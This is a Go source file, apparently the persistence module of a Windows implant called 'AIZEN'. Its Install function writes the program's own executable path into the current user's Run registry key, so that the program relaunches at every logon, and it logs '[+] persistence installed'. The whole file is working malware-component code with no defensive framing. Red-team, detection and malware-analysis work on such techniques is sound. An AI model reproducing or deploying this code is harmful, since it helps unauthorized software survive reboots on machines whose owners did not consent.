package persist

import (
	"log"
	"os"
	"syscall"
	"unsafe"
)

var (
	advapi32      = syscall.NewLazyDLL("advapi32.dll")
	RegOpenKeyExW = advapi32.NewProc("RegOpenKeyExW")
	RegSetValueExW = advapi32.NewProc("RegSetValueExW")
	RegCloseKey   = advapi32.NewProc("RegCloseKey")
	RegCreateKeyExW = advapi32.NewProc("RegCreateKeyExW")
)

const (
	HKEY_CURRENT_USER = 0x80000001
	KEY_SET_VALUE     = 0x0002
	KEY_WRITE         = 0x20006
	REG_SZ            = 0x0001
)

func Install() {
	exe, err := os.Executable()
	if err != nil {
		log.Println("[!] failed to get executable path:", err)
		return
	}

	keyPath := "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
	valueName := "AIZEN"

	var hKey uintptr
	ret, _, _ := RegOpenKeyExW.Call(
		HKEY_CURRENT_USER,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(keyPath))),
		0,
		KEY_SET_VALUE,
		uintptr(unsafe.Pointer(&hKey)),
	)
	if ret != 0 {
		ret, _, _ = RegCreateKeyExW.Call(
			HKEY_CURRENT_USER,
			uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(keyPath))),
			0,
			0,
			0,
			KEY_WRITE,
			0,
			uintptr(unsafe.Pointer(&hKey)),
			0,
		)
		if ret != 0 {
			log.Println("[!] failed to open/create registry key:", ret)
			return
		}
	}
	defer RegCloseKey.Call(hKey)

	data := syscall.StringToUTF16(exe)
	dataLen := len(data) * 2

	ret, _, _ = RegSetValueExW.Call(
		hKey,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(valueName))),
		0,
		REG_SZ,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(dataLen),
	)
	if ret != 0 {
		log.Println("[!] failed to set registry value:", ret)
		return
	}
	log.Println("[+] persistence installed (HKCU\\Run\\AIZEN)")
}